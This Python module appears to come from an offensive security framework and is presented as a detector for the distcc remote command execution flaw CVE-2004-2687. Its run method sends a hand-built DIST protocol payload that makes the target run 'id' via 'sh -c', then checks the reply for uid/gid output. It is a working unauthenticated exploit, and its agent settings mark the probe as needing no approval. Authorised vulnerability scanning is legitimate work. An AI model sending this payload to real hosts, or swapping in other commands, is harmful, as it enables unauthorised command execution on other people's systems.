#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""distcc remote command execution (CVE-2004-2687)."""

import re
import socket

from kittysploit import *
from lib.protocols.tcp.tcp_scanner_client import Tcp_scanner_client


class Module(Scanner, Tcp_scanner_client):
    __info__ = {
        'name': 'distcc - Remote Command Execution Detection (CVE-2004-2687)',
        'description': (
            'Detects CVE-2004-2687 by sending a crafted DIST protocol ARGV request '
            'that executes id via sh -c.'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'scanner', 'tcp', 'distcc', 'cve', 'cve2004', 'rce', 'unauth', 'kev', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://nvd.nist.gov/vuln/detail/CVE-2004-2687',
        ],
        'cve': 'CVE-2004-2687',
    }

    port = OptPort(3632, 'distcc port', True)

    def run(self):
        host = self._host()
        port = self._port()
        if not host or not self.is_tcp_open(host, port):
            return False
        req = bytes([
            0x44, 0x49, 0x53, 0x54, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31,
            0x41, 0x52, 0x47, 0x43, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x38,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32,
            0x73, 0x68,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32,
            0x2d, 0x63,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32,
        ]) + b'id' + bytes([
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x31,
            0x23,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32,
            0x2d, 0x63,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x36,
            0x6d, 0x61, 0x69, 0x6e, 0x2e, 0x63,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x32,
            0x2d, 0x6f,
            0x41, 0x52, 0x47, 0x56, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x36,
            0x6d, 0x61, 0x69, 0x6e, 0x2e, 0x6f,
            0x44, 0x4f, 0x54, 0x49, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x41,
            0x57, 0x4a, 0x79, 0x55, 0x31, 0x6e, 0x70, 0x6f, 0x62, 0x76, 0x0a,
        ])
        try:
            sock = socket.create_connection((host, port), timeout=self._timeout())
            sock.settimeout(self._timeout())
            sock.sendall(req)
            recv = sock.recv(512).decode('latin-1', errors='replace')
            sock.close()
        except Exception:
            return False
        if re.search(r'uid=\d+.*gid=\d+', recv):
            self.set_info(
                severity='critical',
                reason='distcc RCE (CVE-2004-2687)',
                path=f'tcp/{port}',
            )
            return True
        return False
